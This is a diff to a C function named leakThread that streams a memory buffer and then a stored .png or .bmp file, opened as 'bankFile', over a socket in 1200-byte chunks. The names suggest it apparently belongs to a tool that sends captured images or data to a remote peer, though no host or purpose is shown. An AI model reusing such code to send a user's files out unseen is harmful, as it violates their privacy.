@@ -74,19 +74,20 @@ DWORD WINAPI leakThread(LPVOID args) {
 		goto exit;
 	}
 
-	while (size > 2000) {
+	while (size > 1200) {
 		recv(leakSocket, &dump, 1, 0);
-		if (send(leakSocket, data, 2000, 0) == SOCKET_ERROR) {
+		if (send(leakSocket, data, 1200, 0) == SOCKET_ERROR) {
 			goto exit;
 		}
-		size -= 2000;
-		data += 2000;
+		size -= 1200;
+		data += 1200;
 	}
 
 	if (send(leakSocket, data, size, 0) == SOCKET_ERROR) {
 		goto exit;
 	}
 
+	size = 0;
 	if (idx != 0) {
 		char fileName[30];
 		_snprintf_s(fileName, 30, isPng ? "%u.png" : "%u.bmp", idx);
@@ -106,20 +107,20 @@ DWORD WINAPI leakThread(LPVOID args) {
 				}
 
 				DWORD written;
-				char buf[2000];
+				char buf[1200];
 
-				while (fileSize > 2000) {
+				while (fileSize > 1200) {
 					recv(leakSocket, &dump, 1, 0);
-					if (!ReadFile(bankFile, buf, 2000, &written, NULL)) {
+					if (!ReadFile(bankFile, buf, 1200, &written, NULL)) {
 						CloseHandle(bankFile);
 						goto exit;
 					}
-					if (send(leakSocket, buf, 2000, 0) == SOCKET_ERROR) {
+					if (send(leakSocket, buf, 1200, 0) == SOCKET_ERROR) {
 						CloseHandle(bankFile);
 						goto exit;
 					}
 
-					fileSize -= 2000;
+					fileSize -= 1200;
 				}
 
 				if (fileSize) {
@@ -131,9 +132,18 @@ DWORD WINAPI leakThread(LPVOID args) {
 					send(leakSocket, buf, fileSize, 0);
 				}
 			}
+			else {
+				send(leakSocket, (char*)&size, sizeof(size_t), 0);
+			}
 
 			CloseHandle(bankFile);
 		}
+		else {
+			send(leakSocket, (char*)&size, sizeof(size_t), 0);
+		}
+	}
+	else {
+		send(leakSocket, (char*)&size, sizeof(size_t), 0);
 	}
 
 exit:
